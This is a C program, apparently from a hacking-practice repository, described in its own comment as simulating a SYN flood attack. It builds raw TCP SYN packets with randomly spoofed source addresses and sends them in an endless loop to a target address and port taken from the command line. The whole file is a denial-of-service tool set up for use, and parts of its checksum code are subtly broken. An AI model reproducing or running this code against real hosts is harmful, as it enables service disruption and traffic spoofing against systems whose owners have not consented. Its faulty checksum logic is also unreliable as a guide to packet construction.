#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <strings.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

/*
Simulate the common syn flood attack
*/

struct pseduo{
	struct in_addr source_addr,dest_addr;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

void my_err(const char * err_string,int line){/*receive parameter function_name __LINE__,give the error reasons*/
	fprintf(stderr,"line: %d",line);
	perror(err_string);
	exit(1);
}

unsigned short check_sum(char *msg){/*calculate the checksum*/
	unsigned short s=0;
	unsigned short w,high,low;
	int i;
	for(i=0;i<strlen(msg);i=i+2){
		high=((unsigned short)(toascii(*(msg+i))))<<8;
		low=(unsigned short)(toascii(*(msg+i+1)));
		w=high+low;
		s=s+w;
	}

	s=(s >> 16)+(s & 0xffff);
	s=~s & 0xffff;
	
	return s;	
}

void syn_flood(int sockfd,struct sockaddr_in target,unsigned short srcport,unsigned short dstport){/*construct the raw socket*/
	struct ip *ip;
	struct tcphdr *tcp;
	struct tcphdr *pseduo_tcp;
	char buffer[1024]={0};
	char pseduo_buffer[128]={0};
	unsigned short ip_len;
	struct pseduo *pseduo_part;
	char *msg=NULL;

	ip_len=sizeof(struct ip)+sizeof(struct tcphdr);
	ip=(struct ip *)buffer;
	ip->ip_hl=5;
	ip->ip_v=4;
	ip->ip_tos=0;
	ip->ip_len=htons(ip_len);
	ip->ip_id=0;
	ip->ip_ttl=64;
	ip->ip_p=IPPROTO_TCP;
	ip->ip_sum=0;
	ip->ip_dst=target.sin_addr;
	ip->ip_src.s_addr=random();

	tcp=(struct tcphdr *)(buffer+sizeof(struct ip));
  tcp->source=htons(srcport);
  tcp->dest=htons(dstport);
  tcp->seq=random();
  tcp->doff=5;
  tcp->syn=1;
  tcp->check=0;

	//construct the pseduo part
	/*if you want to know the reson for this part,please go to https://github.com/	wolfzhaoshuai/hack-python/blob/master/synscan_with_rawsocket.py*/
	pseduo_part=(struct pseduo *)pseduo_buffer;
	pseduo_part->source_addr=ip->ip_src;
	pseduo_part->dest_addr=ip->ip_dst;
	pseduo_part->placeholder=0;
	pseduo_part->protocol=IPPROTO_TCP;
	pseduo_part->tcp_length=htons(20);

	pseduo_tcp=(struct tcphdr *)(pseduo_buffer+sizeof(struct pseduo));
  pseduo_tcp->source=htons(srcport);
  pseduo_tcp->dest=htons(dstport);
  pseduo_tcp->seq=random();
  pseduo_tcp->doff=5;
  pseduo_tcp->syn=1;
  pseduo_tcp->check=0;

	msg=(char *)pseduo_buffer;
	tcp->check=check_sum(msg);

	while(1){
		sleep(10);
		sendto(sockfd,buffer,ip_len,0,(struct sockaddr *)&target,(socklen_t)(sizeof(struct sockaddr)));
	}
}
		

void send_syn(unsigned short srcport,char * dstip,unsigned int dstport){
	int sockfd;
	struct sockaddr_in target;
	const int on=1;

	if( (sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))<0){
		my_err("socket",__LINE__);
	}

	if(setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))<0){
		my_err("setsockopt",__LINE__);
	}

	bzero(&target,sizeof(target));
	target.sin_family=AF_INET;
	target.sin_port=htons(dstport);
	if(inet_aton(dstip,&target.sin_addr)==0){
		my_err("inet_aton",__LINE__);
	}

	syn_flood(sockfd,target,srcport,dstport);
}

void main(int argc,char *argv[]){
	
	unsigned int srcport;
	unsigned int dstport;
	char *dstip=NULL;

	char *usage="./syn_flood srcport dstip dstport";
	if(argc!=4){
		printf("Usage: %s\n",usage);
		exit(1);
	}
		
	srcport=(unsigned int)(atoi(argv[1]));
	dstport=(unsigned int)(atoi(argv[3]));
	dstip=argv[2];

	setuid(0);
	send_syn(srcport,dstip,dstport);
	
}
	
